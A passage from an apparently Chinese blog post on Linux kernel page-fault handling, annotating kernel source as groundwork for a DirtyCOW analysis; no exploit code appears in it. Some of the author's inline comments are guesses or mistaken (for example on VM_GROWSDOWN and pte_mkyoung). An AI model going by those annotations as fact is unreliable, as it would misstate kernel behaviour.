class="comment">//给进程的mm_struct上锁</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;<span class="comment">//没能锁上</span></span><br><span class="line">		<span class="keyword">if</span> ((error_code &amp; PF_USER) == <span class="number">0</span> &amp;&amp; <span class="comment">//内核空间页异常</span></span><br><span class="line">		    !search_exception_tables(regs-&gt;ip)) &#123;</span><br><span class="line">			bad_area_nosemaphore(regs, error_code, address);<span class="comment">//杀死进程和内核的&quot;Oops&quot;</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">retry:</span><br><span class="line">		down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;<span class="comment">//锁上了</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * The above down_read_trylock() might have succeeded in</span></span><br><span class="line"><span class="comment">		 * which case we&#x27;ll have missed the might_sleep() from</span></span><br><span class="line"><span class="comment">		 * down_read():</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		might_sleep();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	vma = find_vma(mm, address);<span class="comment">//寻找该线性地址位于哪个vma中</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!vma)) &#123;<span class="comment">//没找到，说明该地址不属于该进程的任何一个vma中（非法访问？段错误？）</span></span><br><span class="line">		bad_area(regs, error_code, address);<span class="comment">//杀死进程和内核的&quot;Oops&quot;</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))<span class="comment">//发生缺页异常的地址刚好位于某个vma区域中</span></span><br><span class="line">		<span class="keyword">goto</span> good_area;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;<span class="comment">//设置了VM_GROWSDOWN标记，表示缺页异常地址位于堆栈区</span></span><br><span class="line">		bad_area(regs, error_code, address);<span class="comment">//杀死进程和内核的&quot;Oops&quot;</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (error_code &amp; PF_USER) &#123;<span class="comment">//缺页异常地址位于用户空间</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Accessing the stack below %sp is always a bug.</span></span><br><span class="line"><span class="comment">		 * The large cushion allows instructions like enter</span></span><br><span class="line"><span class="comment">		 * and pusha to work. (&quot;enter $65535, $31&quot; pushes</span></span><br><span class="line"><span class="comment">		 * 32 pointers and then decrements %sp by 65535.)</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(address + <span class="number">65536</span> + <span class="number">32</span> * <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>) &lt; regs-&gt;sp)) &#123;<span class="comment">//看不懂都...</span></span><br><span class="line">			bad_area(regs, error_code, address);<span class="comment">//杀死进程和内核的&quot;Oops&quot;</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;<span class="comment">//用户栈上的缺页异常，但是栈增长失败了</span></span><br><span class="line">		bad_area(regs, error_code, address);<span class="comment">//杀死进程和内核的&quot;Oops&quot;</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Ok, we have a good vm_area for this memory access, so</span></span><br><span class="line"><span class="comment">	 * we can handle it..</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="comment">//运行到这里，说明是正常的缺页异常，addr属于进程的地址空间，此时进行请求调页，分配物理内存</span></span><br><span class="line">good_area:</span><br><span class="line">	<span class="keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;<span class="comment">//error code和vma冲突？</span></span><br><span class="line">		bad_area_access_error(regs, error_code, address);<span class="comment">//杀死进程和内核的&quot;Oops&quot;</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If for any reason at all we couldn&#x27;t handle the fault,</span></span><br><span class="line"><span class="comment">	 * make sure we exit gracefully rather than endlessly redo</span></span><br><span class="line"><span class="comment">	 * the fault.  Since we never set FAULT_FLAG_RETRY_NOWAIT, if</span></span><br><span class="line"><span class="comment">	 * we get VM_FAULT_RETRY back, the mmap_sem has been unlocked.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	fault = handle_mm_fault(mm, vma, address, flags);<span class="comment">//分配物理页的核心函数</span></span><br><span class="line">	major |= fault &amp; VM_FAULT_MAJOR;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we need to retry the mmap_sem has already been released,</span></span><br><span class="line"><span class="comment">	 * and if there is a fatal signal pending there is no guarantee</span></span><br><span class="line"><span class="comment">	 * that we made any progress. Handle this case first.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;<span class="comment">//没找到设置这个标志位的，不管...</span></span><br><span class="line">		<span class="comment">/* Retry at most once */</span></span><br><span class="line">		<span class="keyword">if</span> (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;</span><br><span class="line">			flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;<span class="comment">//清除【重试】标志位</span></span><br><span class="line">			flags |= FAULT_FLAG_TRIED;<span class="comment">//设置【已试】标志位</span></span><br><span class="line">			<span class="keyword">if</span> (!fatal_signal_pending(tsk))</span><br><span class="line">				<span class="keyword">goto</span> retry;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* User mode? Just return to handle the fatal exception */</span></span><br><span class="line">		<span class="keyword">if</span> (flags &amp; FAULT_FLAG_USER)<span class="comment">//用户态触发用户地址空间缺页异常，交由上层函数处理了</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Not returning to user mode? Handle exceptions or die: */</span></span><br><span class="line">		no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);<span class="comment">//内核地址空间缺页异常，简单处理一下，交由上层函数处理</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_ERROR)) &#123;</span><br><span class="line">		mm_fault_error(regs, error_code, address, fault);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Major/minor page fault accounting. If any of the events</span></span><br><span class="line"><span class="comment">	 * returned VM_FAULT_MAJOR, we account it as a major fault.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (major) &#123;</span><br><span class="line">		tsk-&gt;maj_flt++;</span><br><span class="line">		perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, <span class="number">1</span>, regs, address);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		tsk-&gt;min_flt++;</span><br><span class="line">		perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, <span class="number">1</span>, regs, address);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	check_v8086_mode(regs, address, tsk);</span><br><span class="line">&#125;</span><br><span class="line">NOKPROBE_SYMBOL(__do_page_fault);</span><br></pre></td></tr></table></figure>

<p>大致流程应当如下：</p>
<ul>
<li>判断缺页异常地址位于用户地址空间还是内核地址空间</li>
<li>位于内核地址空间<ul>
<li>内核态触发缺页异常，<code>vmalloc_fault()</code> 处理</li>
<li>用户态触发缺页异常，段错误，发送SIGSEGV信号</li>
</ul>
</li>
<li>位于用户地址空间<ul>
<li>内核态触发缺页异常<ul>
<li>SMAP保护已开启，终止进程</li>
<li>进程无地址空间 | 设置了不处理缺页异常，终止进程</li>
<li>进入下一步流程</li>
</ul>
</li>
<li>用户态触发缺页异常<ul>
<li>设置对应标志位，进入下一步流程</li>
</ul>
</li>
<li>检查是否是写页异常，可能是页不存在&#x2F;无权限写，设置对应标志位</li>
<li>找寻线性地址所属的线性区（vma）[1]<ul>
<li>不存在对应vma，非法访问</li>
<li>存在对应vma，且位于vma所描述区域中，进入下一步流程</li>
<li>存在对应vma，不位于vma所描述区域中，说明可能是位于堆栈（stack），尝试增长堆栈</li>
</ul>
</li>
<li>✳调用 <code>handle_mm_fault()</code> 函数处理，这也是处理缺页异常的核心函数<ul>
<li>失败了，进行重试（返回到[1]，只会重试一次）</li>
<li>其他收尾处理</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>其中进程描述符（task_struct）、内存描述符（mm_struct）、线性区描述符vm_arena_struct）之间的关系应当如下图所示（转自看雪论坛）：</p>
<p><img src="https://i.loli.net/2021/04/12/IHzaPwMrkCUs3xj.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>很可惜的是本次分析的dirtyCOW虽然走 <code>__handle_mm_fault()</code> 但是不走 <code>__do_page_fault()</code> （<del>这不是白分析一通么</del>（<del>恼</del>）</p>
</blockquote>
<h4 id="分配页表项：-handle-mm-fault"><a href="#分配页表项：-handle-mm-fault" class="headerlink" title="分配页表项：__handle_mm_fault()"></a>分配页表项：__handle_mm_fault()</h4><p>该函数定义于 <code>mm/memory.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * By the time we get here, we already hold the mm semaphore</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The mmap_sem may have been released depending on flags and our</span></span><br><span class="line"><span class="comment"> * return value.  See filemap_fault() and __lock_page_or_retry().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __handle_mm_fault(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span><br><span class="line">			     <span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">unsigned</span> <span class="type">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//Linux使用四级页表结构</span></span><br><span class="line">	<span class="type">pgd_t</span> *pgd;<span class="comment">//页全局目录项</span></span><br><span class="line">	<span class="type">pud_t</span> *pud;<span class="comment">//页上级目录项</span></span><br><span class="line">	<span class="type">pmd_t</span> *pmd;<span class="comment">//页中间目录项</span></span><br><span class="line">	<span class="type">pte_t</span> *pte;<span class="comment">//页表项</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//以下为页表相关处理</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(is_vm_hugetlb_page(vma)))</span><br><span class="line">		<span class="keyword">return</span> hugetlb_fault(mm, vma, address, flags);</span><br><span class="line"></span><br><span class="line">	pgd = pgd_offset(mm, address);<span class="comment">//获取全局页表项</span></span><br><span class="line">	pud = pud_alloc(mm, pgd, address);<span class="comment">//分配上级页表项（分配一页新的内存作为pud）</span></span><br><span class="line">	<span class="keyword">if</span> (!pud)<span class="comment">//失败了，返回</span></span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">	pmd = pmd_alloc(mm, pud, address);<span class="comment">//分配中间页表项分配一页新的内存作为pmd）</span></span><br><span class="line">	<span class="keyword">if</span> (!pmd)<span class="comment">//失败了，返回</span></span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">	<span class="keyword">if</span> (pmd_none(*pmd) &amp;&amp; transparent_hugepage_enabled(vma)) &#123;</span><br><span class="line">		<span class="type">int</span> ret = create_huge_pmd(mm, vma, address, pmd, flags);<span class="comment">//创建页表中间项？</span></span><br><span class="line">		<span class="keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))<span class="comment">//失败了，返回</span></span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="type">pmd_t</span> orig_pmd = *pmd;</span><br><span class="line">		<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">		barrier();</span><br><span class="line">		<span class="keyword">if</span> (pmd_trans_huge(orig_pmd)) &#123;</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> dirty = flags &amp; FAULT_FLAG_WRITE;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If the pmd is splitting, return and retry the</span></span><br><span class="line"><span class="comment">			 * the fault.  Alternative: wait until the split</span></span><br><span class="line"><span class="comment">			 * is done, and goto retry.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (pmd_trans_splitting(orig_pmd))</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (pmd_protnone(orig_pmd))</span><br><span class="line">				<span class="keyword">return</span> do_huge_pmd_numa_page(mm, vma, address,</span><br><span class="line">							     orig_pmd, pmd);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (dirty &amp;&amp; !pmd_write(orig_pmd)) &#123;</span><br><span class="line">				ret = wp_huge_pmd(mm, vma, address, pmd,</span><br><span class="line">							orig_pmd, flags);</span><br><span class="line">				<span class="keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))</span><br><span class="line">					<span class="keyword">return</span> ret;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				huge_pmd_set_accessed(mm, vma, address, pmd,</span><br><span class="line">						      orig_pmd, dirty);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Use __pte_alloc instead of pte_alloc_map, because we can&#x27;t</span></span><br><span class="line"><span class="comment">	 * run pte_offset_map on the pmd, if an huge pmd could</span></span><br><span class="line"><span class="comment">	 * materialize from under us from a different thread.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(pmd_none(*pmd)) &amp;&amp;</span><br><span class="line">	    unlikely(__pte_alloc(mm, vma, pmd, address)))</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">	<span class="comment">/* if an huge pmd materialized from under us just retry later */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(pmd_trans_huge(*pmd)))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * A regular pmd is established and it can&#x27;t morph into a huge pmd</span></span><br><span class="line"><span class="comment">	 * from under us anymore at this point because we hold the mmap_sem</span></span><br><span class="line"><span class="comment">	 * read mode and khugepaged takes it in write mode. So now it&#x27;s</span></span><br><span class="line"><span class="comment">	 * safe to run pte_offset_map().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	pte = pte_offset_map(pmd, address);<span class="comment">//获取到最终的页表项</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> handle_pte_fault(mm, vma, address, pte, pmd, flags);<span class="comment">//核心处理函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> 该函数为触发缺页异常的线性地址address分配各级的页目录，在这里的pgd表会直接使用该进程的 <code>mm_struct</code> 中的 pgd 表，但是pud、pmd表都存在着创建新表的可能</p>
<p>此时我们已经有了与触发缺页异常的地址相对应的页表项（PTE），接下来我们将进入 <code>handle_pte_fault()</code> 函数进行下一步</p>
<h4 id="处理页表项：handle-pte-fault"><a href="#处理页表项：handle-pte-fault" class="headerlink" title="处理页表项：handle_pte_fault()"></a>处理页表项：handle_pte_fault()</h4><p>该函数同样定义于 <code>mm/memory.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * These routines also need to handle stuff like marking pages dirty</span></span><br><span class="line"><span class="comment"> * and/or accessed for architectures that don&#x27;t do it in hardware (most</span></span><br><span class="line"><span class="comment"> * RISC architectures).  The early dirtying is also good on the i386.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * There is also a hook called &quot;update_mmu_cache()&quot; that architectures</span></span><br><span class="line"><span class="comment"> * with external mmu caches can use to update those (ie the Sparc or</span></span><br><span class="line"><span class="comment"> * PowerPC hashed page tables that act as extended TLBs).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes,</span></span><br><span class="line"><span class="comment"> * but allow concurrent faults), and pte mapped but not yet locked.</span></span><br><span class="line"><span class="comment"> * We return with pte unmapped and unlocked.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The mmap_sem may have been released depending on flags and our</span></span><br><span class="line"><span class="comment"> * return value.  See filemap_fault() and __lock_page_or_retry().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">handle_pte_fault</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm,</span></span><br><span class="line"><span class="params">		     <span class="keyword">struct</span> vm_area_struct *vma, <span class="type">unsigned</span> <span class="type">long</span> address,</span></span><br><span class="line"><span class="params">		     <span class="type">pte_t</span> *pte, <span class="type">pmd_t</span> *pmd, <span class="type">unsigned</span> <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">pte_t</span> entry;</span><br><span class="line">	<span class="type">spinlock_t</span> *ptl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * some architectures can have larger ptes than wordsize,</span></span><br><span class="line"><span class="comment">	 * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and CONFIG_32BIT=y,</span></span><br><span class="line"><span class="comment">	 * so READ_ONCE or ACCESS_ONCE cannot guarantee atomic accesses.</span></span><br><span class="line"><span class="comment">	 * The code below just needs a consistent view for the ifs and</span></span><br><span class="line"><span class="comment">	 * we later double check anyway with the ptl lock held. So here</span></span><br><span class="line"><span class="comment">	 * a barrier will do.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	entry = *pte;<span class="comment">//获取页表项中的内存页</span></span><br><span class="line">	barrier();</span><br><span class="line">    <span class="comment">//该页不在主存中</span></span><br><span class="line">	<span class="keyword">if</span> (!pte_present(entry)) &#123;<span class="comment">//pte中内存页所映射的物理地址（*pte）不存在，可能是调页请求</span></span><br><span class="line">		<span class="keyword">if</span> (pte_none(entry)) &#123;<span class="comment">//pte中内容为空，表示进程第一次访问该页</span></span><br><span class="line">			<span class="keyword">if</span> (vma_is_anonymous(vma))<span class="comment">//vma为匿名区域，分配物理页框，初始化为全0</span></span><br><span class="line">				<span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line">							 pte, pmd, flags);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">						flags, entry);<span class="comment">//非匿名区域，分配物理页框</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">					pte, pmd, flags, entry);<span class="comment">//说明该页之前存在于主存中，但是被换到外存了（太久没用被放到了交换空间里？），那就再换回来就行</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//该页在主存中</span></span><br><span class="line">	<span class="keyword">if</span> (pte_protnone(entry)) <span class="comment">// 查看 pte 是否有 _PAGE_PROTNONE 标志位</span></span><br><span class="line">		<span class="keyword">return</span> do_numa_page(mm, vma, address, entry, pte, pmd);</span><br><span class="line"></span><br><span class="line">	ptl = pte_lockptr(mm, pmd);</span><br><span class="line">	spin_lock(ptl);<span class="comment">//自旋锁，多线程操作</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pte_same(*pte, entry)))</span><br><span class="line">		<span class="keyword">goto</span> unlock;</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;<span class="comment">// 存在 FAULT_FLAG_WRITE 标志位，表示缺页异常由写操作引起</span></span><br><span class="line">		<span class="keyword">if</span> (!pte_write(entry))<span class="comment">//对应的页不可写</span></span><br><span class="line">			<span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">					pte, pmd, ptl, entry);<span class="comment">//进行写时复制，将内容写入由 do_fault()-&gt;do_cow_fault()分配的内存页中</span></span><br><span class="line">		entry = pte_mkdirty(entry);<span class="comment">//将该页【标脏】</span></span><br><span class="line">	&#125;</span><br><span class="line">	entry = pte_mkyoung(entry);<span class="comment">//将该页标干净？</span></span><br><span class="line">	<span class="keyword">if</span> (ptep_set_access_flags(vma, address, pte, entry, flags &amp; FAULT_FLAG_WRITE)) &#123;</span><br><span class="line">		update_mmu_cache(vma, address, pte);<span class="comment">//pte内容发生变化，将新内容写入pte页表项中</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * This is needed only for protection faults but the arch code</span></span><br><span class="line"><span class="comment">		 * is not yet telling us if this is a protection fault or not.</span></span><br><span class="line"><span class="comment">		 * This still avoids useless tlb flushes for .text page faults</span></span><br><span class="line"><span class="comment">		 * with threads.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE)</span><br><span class="line">			flush_tlb_fix_spurious_fault(vma, address);</span><br><span class="line">	&#125;</span><br><span class="line">unlock:</span><br><span class="line">	pte_unmap_unlock(pte, ptl);<span class="comment">//解自旋锁</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们不难看出该函数的流程如下：</p>
<ul>
<li>或许页表项中内存页</li>
<li>该页不在主存中[1]<ul>
<li>pte项为空，表示进程第一次访问该页，未与物理页建立映射关系<ul>
<li>该页为匿名页，分配内容初始化为0的页框</li>
<li>该页不为匿名页，调用 <code>do_fault()</code> 进行进一步的分配操作</li>
</ul>
</li>
<li>pte项不为空，说明该页此前访问过，但是被换到交换空间（外存）里了（太久没用？），此时只需将该页交换回来即可</li>
</ul>
</li>
<li>该页在主存中[2]<ul>
<li>缺页异常由【写】操作引起<ul>
<li>对应页不可写，调用 <code>do_wp_page()</code> 进行写时复制</li>
<li>对应页可写，标脏</li>
</ul>
</li>
<li>将新内容写入pte页表项中</li>
</ul>
</li>
</ul>
<p>那么我们不难看出，当一个进程首次访问一个内存页时应当会触发两次缺页异常，第一次走[1]，第二次走[2]，后面我们再进行进一步的分析</p>
<p>接下来我们来看 <code>do_fault()</code> 函数的流程</p>
<h4 id="挂载物理页：do-fault"><a href="#挂载物理页：do-fault" class="headerlink" title="挂载物理页：do_fault()"></a>挂载物理页：do_fault()</h4><p>这个函数的逻辑较为简单，主要是根据相应的情况调用不同的函数，代码同样位于  <code>mm/memory.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes,</span></span><br><span class="line"><span class="comment"> * but allow concurrent faults).</span></span><br><span class="line"><span class="comment"> * The mmap_sem may have been released depending on flags and our</span></span><br><span class="line"><span class="comment"> * return value.  See filemap_fault() and __lock_page_or_retry().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_fault</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">pte_t</span> *page_table, <span class="type">pmd_t</span> *pmd,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> flags, <span class="type">pte_t</span> orig_pte)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">			- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line"></span><br><span class="line">	pte_unmap(page_table);</span><br><span class="line">	<span class="comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span></span><br><span class="line">	<span class="keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line">	<span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))<span class="comment">//非写操作引起的缺页异常（读操作）</span></span><br><span class="line">		<span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">				